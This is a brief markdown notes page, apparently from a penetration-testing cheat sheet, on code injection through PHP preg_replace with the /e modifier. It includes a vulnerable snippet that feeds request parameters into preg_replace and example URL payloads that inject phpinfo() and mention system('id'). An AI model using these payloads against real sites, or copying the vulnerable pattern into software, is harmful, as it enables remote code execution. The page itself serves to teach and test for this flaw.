## Preg_Replace exploit

`preg_replace($pattern, $replacement, $subject)`

Searches subject for matches to pattern and replaces them with replacement.

Preg_replace isn't vulnerable except if the patern end with /e.

Cause /e let replacement execute php function.

If you can control $pattern or if it finish with /e you can execute code like : `system('id')`.

### Exemple

Simple code :

```php
echo "original : ".$subject ."</br>";
    echo "replaced : ".preg_replace($pattern, $replacement, $subject);
```

`index.php?pattern=/as/&replacement=As&subject=as your wish exploit`

> It replace as per As in the string \'as you wish exploit\'.

but what if :

`index.php?pattern=/as/e&replacement=phpinfo();&subject=as your wish exploit`

> It replace as per the output of the fucntion phpinfo() cause we had /e at the end.

#### Doc

- [man preg_replace](https://www.php.net/manual/en/function.preg-replace.php)
- [exploit preg_replace](https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4)

[**:arrow_right_hook: Back php**](php.md)